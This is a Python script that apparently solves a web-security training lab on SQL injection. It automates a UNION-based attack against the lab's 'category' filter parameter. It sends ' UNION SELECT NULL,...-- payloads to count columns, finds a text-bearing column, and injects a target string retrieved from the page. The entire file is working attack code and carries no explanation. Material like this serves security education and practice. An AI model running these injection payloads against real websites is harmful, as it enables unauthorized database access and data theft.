import re
from lib import SESSION, generate_parser, check_is_lab_solved

if __name__ == "__main__":
    args = generate_parser()

    lab_url = args.lab_url.strip("/")

    print("[+] Fetching the string that is to be queried from the database")

    response = re.search(
        r"Make\sthe\sdatabase\sretrieve\sthe\sstring:\s'(.+?)'",
        SESSION.get(lab_url).text,
    )

    target_string = ""

    if response:
        target_string = response.group(1)
    else:
        print("[-] Failed to get the string to be queried")
        exit()

    print(f"[+] String to be queried from database: {target_string}")

    print("[+] Determining the number of columns using UNION SELECT...")

    columns = 1

    while True:
        payload = ", ".join(["NULL"] * columns)
        query = f"' UNION SELECT {payload}--"

        print(f"[+] Making Query {columns}: {lab_url}/filter?category={query}")

        if SESSION.get(f"{lab_url}/filter?category={query}").status_code == 200:
            break
        else:
            columns += 1

    print(f"[+] The number of columns found using UNION SELECT is {columns}")

    print("[+] Finding a column containing text...")

    target_column = 0

    for i in range(columns):
        payload = ", ".join(["'string'" if i == j else "NULL" for j in range(columns)])

        query = f"' UNION SELECT {payload}--"

        print(f"[+] Making Query {i}: {lab_url}/filter?category={query}")

        if SESSION.get(f"{lab_url}/filter?category={query}").status_code == 200:
            target_column = i
            print(f"[+] The column containing text is: {i} (Index starts from 0!)")
            break
        else:
            continue

    print("[+] Querying the target string...")

    payload = ", ".join(
        [f"'{target_string}'" if target_column == j else "NULL" for j in range(columns)]
    )

    query = f"' UNION SELECT {payload}--"

    print(f"[+] Making Query: {lab_url}/filter?category={query}")

    if SESSION.get(f"{lab_url}/filter?category={query}").status_code == 200:
        print("[+] The string is queried successfully")
    else:
        print("[-] Failed to query the string")
        exit()

    check_is_lab_solved(lab_url)
